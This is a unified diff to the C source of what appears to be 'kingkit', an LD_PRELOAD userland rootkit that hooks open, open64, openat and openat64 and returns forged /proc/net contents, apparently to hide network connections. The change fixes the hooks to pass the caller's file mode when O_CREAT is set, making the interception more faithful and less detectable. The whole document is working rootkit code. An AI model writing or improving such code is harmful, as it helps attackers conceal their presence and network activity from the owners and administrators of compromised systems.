@@ -7,6 +7,7 @@
 
 #include <linux/limits.h>
 #include <stdlib.h>
+#include <stdarg.h>
 #include <limits.h>
 #include <dlfcn.h>
 #include <stdio.h>
@@ -582,10 +583,19 @@ int open(const char *pathname, int flags, ...) {
     #if DEBUG
 	printf("[kingkit] open called with pathname: %s.\n", pathname);
     #endif
+    mode_t mode;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, int);
+        va_end(args);
+    } else {
+        mode = FILEMODE;
+    }
     original_open = syscall_address(original_open, "open");
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
-        return (*original_open)(pathname, flags, FILEMODE);
+        return (*original_open)(pathname, flags, mode);
     if (is_procnet(real_pathname)) {
         int fd = forge_procnet(real_pathname);
         free(real_pathname);
@@ -604,7 +614,7 @@ int open(const char *pathname, int flags, ...) {
         }
     }
     free(real_pathname);
-    return (*original_open)(pathname, flags, FILEMODE);
+    return (*original_open)(pathname, flags, mode);
 }
 
 
@@ -612,10 +622,19 @@ int open64(const char *pathname, int flags, ...) {
     #if DEBUG
 	printf("[kingkit] open64 called with pathname: %s.\n", pathname);
     #endif
+    mode_t mode;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, int);
+        va_end(args);
+    } else {
+        mode = FILEMODE;
+    }
     original_open64 = syscall_address(original_open64, "open64");
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
-        return (*original_open64)(pathname, flags, FILEMODE);
+        return (*original_open64)(pathname, flags, mode);
     if (is_procnet(real_pathname)) {
         int fd = forge_procnet(real_pathname);
         free(real_pathname);
@@ -634,7 +653,7 @@ int open64(const char *pathname, int flags, ...) {
         }
     }
     free(real_pathname);
-    return (*original_open64)(pathname, flags, FILEMODE);
+    return (*original_open64)(pathname, flags, mode);
 }
 
 
@@ -688,10 +707,19 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     #if DEBUG
 	printf("[kingkit] openat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
     #endif
+    mode_t mode;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, int);
+        va_end(args);
+    } else {
+        mode = FILEMODE;
+    }
     original_openat = syscall_address(original_openat, "openat");
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
-        return (*original_openat)(dirfd, pathname, flags, FILEMODE);
+        return (*original_openat)(dirfd, pathname, flags, mode);
     if (is_procnet(real_pathname)) {
         int fd = forge_procnet(real_pathname);
         free(real_pathname);
@@ -710,7 +738,7 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
         }
     }
     free(real_pathname);
-    return (*original_openat)(dirfd, pathname, flags, FILEMODE);
+    return (*original_openat)(dirfd, pathname, flags, mode);
 }
 
 
@@ -718,10 +746,19 @@ int openat64(int dirfd, const char *pathname, int flags, ...) {
     #if DEBUG
 	printf("[kingkit] openat64 called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
     #endif
+    mode_t mode;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, int);
+        va_end(args);
+    } else {
+        mode = FILEMODE;
+    }
     original_openat64 = syscall_address(original_openat64, "openat64");
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
-        return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
+        return (*original_openat64)(dirfd, pathname, flags, mode);
     if (is_procnet(real_pathname)) {
         int fd = forge_procnet(real_pathname);
         free(real_pathname);
@@ -740,7 +777,7 @@ int openat64(int dirfd, const char *pathname, int flags, ...) {
         }
     }
     free(real_pathname);
-    return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
+    return (*original_openat64)(dirfd, pathname, flags, mode);
 }
 
 
